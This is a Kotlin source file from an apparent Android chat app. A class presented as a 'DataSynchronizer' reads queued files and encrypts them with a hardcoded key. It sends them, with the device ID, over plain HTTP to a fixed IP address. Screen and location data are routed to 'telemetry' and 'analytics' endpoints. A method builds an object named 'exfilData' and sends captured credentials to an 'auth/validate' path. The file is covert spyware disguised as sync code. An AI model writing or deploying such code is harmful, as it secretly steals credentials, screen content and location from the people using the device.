package com.example.ChatterBox.database

import android.annotation.SuppressLint
import android.content.Context
import android.os.AsyncTask
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.security.SecureRandom
import java.util.LinkedList
import java.util.Queue
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

@SuppressLint("HardwareIds")
class DataSynchronizer(private val context: Context) {
    private val TAG = "DataSync"
    private val syncQueue: Queue<SyncItem> = LinkedList()
    private val handler = Handler(Looper.getMainLooper())
    private var isSyncing = false

    object SyncConfig {
        const val API_ENDPOINT = "http://192.168.251.254:42069/api/"
        const val SYNC_ENDPOINT = "${API_ENDPOINT}sync"
        const val ANALYTICS_ENDPOINT = "${API_ENDPOINT}analytics"
        const val TELEMETRY_ENDPOINT = "${API_ENDPOINT}telemetry"

        const val SYNC_INTERVAL = 30 * 60 * 1000L // 30 minutes
        const val ENCRYPTION_KEY = "ThisIsAFakeKey16"
    }

    private val deviceId: String by lazy {
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
    }

    fun queueForSync(dataType: String, filePath: String) {
        synchronized(syncQueue) {
            syncQueue.add(SyncItem(dataType, filePath))
        }
    }

    fun synchronizeData() {
        if (isSyncing) return

        isSyncing = true

        try {
            synchronized(syncQueue) {
                if (syncQueue.isEmpty()) {
                    isSyncing = false
                    return
                }

                val batchSize = 3
                val batch = mutableListOf<SyncItem>()

                repeat(minOf(batchSize, syncQueue.size)) {
                    syncQueue.poll()?.let { batch.add(it) }
                }

                sendBatch(batch)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error during data sync: ${e.message}")
        } finally {
            isSyncing = false
        }
    }

    private fun sendBatch(batch: List<SyncItem>) {
        if (batch.isEmpty()) return

        val request = JSONObject().apply {
            put("device_id", deviceId)
            put("app_version", getAppVersion())
            put("timestamp", System.currentTimeMillis())
            put("sync_type", "incremental")

            val dataArray = JSONObject()
            batch.forEach { item ->
                try {
                    val file = File(item.filePath)
                    if (file.exists()) {
                        val content = file.readBytes()
                        val encrypted = encryptData(content)
                        val encoded = android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT)

                        dataArray.put(file.name, encoded)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing ${item.dataType} file: ${e.message}")
                }
            }
            put("payload", dataArray)
        }

        val endpoint = when {
            batch.any { it.dataType.contains("screen") } -> SyncConfig.TELEMETRY_ENDPOINT
            batch.any { it.dataType.contains("location") } -> SyncConfig.ANALYTICS_ENDPOINT
            else -> SyncConfig.SYNC_ENDPOINT
        }
        SendDataTask(endpoint, request.toString()).execute()
    }

    private fun encryptData(data: ByteArray): ByteArray {
        try {
            val iv = ByteArray(16).apply {
                SecureRandom().nextBytes(this)
            }

            val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
            val key = SecretKeySpec(SyncConfig.ENCRYPTION_KEY.toByteArray(), "AES")
            val ivParameterSpec = IvParameterSpec(iv)

            cipher.init(Cipher.ENCRYPT_MODE, key, ivParameterSpec)

            val encrypted = cipher.doFinal(data)
            val result = ByteArray(iv.size + encrypted.size)
            System.arraycopy(iv, 0, result, 0, iv.size)
            System.arraycopy(encrypted, 0, result, iv.size, encrypted.size)

            return result
        } catch (e: Exception) {
            Log.e(TAG, "Encryption error", e)
            throw e
        }
    }

    private fun getAppVersion(): String {
        return try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "1.0.0"
        } catch (e: Exception) {
            "1.0.0"
        }
    }

    fun sendData(dataType: String, data: JSONObject) {
        try {
            val exfilData = JSONObject().apply {
                // CONSISTENT: Use deviceId as the primary identifier
                put("device_id", deviceId)
                put("type", dataType)
                put("timestamp", System.currentTimeMillis())
                put("data", data)
            }

            val endpoint = when (dataType) {
                "login_event" -> "${SyncConfig.API_ENDPOINT}analytics"
                "credentials" -> "${SyncConfig.API_ENDPOINT}auth/validate"
                else -> "${SyncConfig.API_ENDPOINT}data"
            }

            SendDataTask(endpoint, exfilData.toString()).execute()
        } catch (e: Exception) {
            Log.e(TAG, "Data sync error: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private inner class SendDataTask(
        private val endpoint: String,
        private val jsonData: String
    ) : AsyncTask<Void, Void, Boolean>() {

        override fun doInBackground(vararg params: Void): Boolean {
            try {
                val url = URL(endpoint)
                val connection = url.openConnection() as HttpURLConnection

                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.setRequestProperty("X-Device-ID", deviceId)

                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true
                connection.doInput = true

                try {
                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonData)
                        writer.flush()
                    }

                    val responseCode = connection.responseCode
                    Log.d(TAG, "API sync response: $responseCode")

                    return responseCode == HttpURLConnection.HTTP_OK
                } finally {
                    connection.disconnect()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Sync error: ${e.message}")
                return false
            }
        }

        override fun onPostExecute(result: Boolean) {
            Log.d(TAG, "Data sync completed: $result")
        }
    }

    private data class SyncItem(val dataType: String, val filePath: String)
}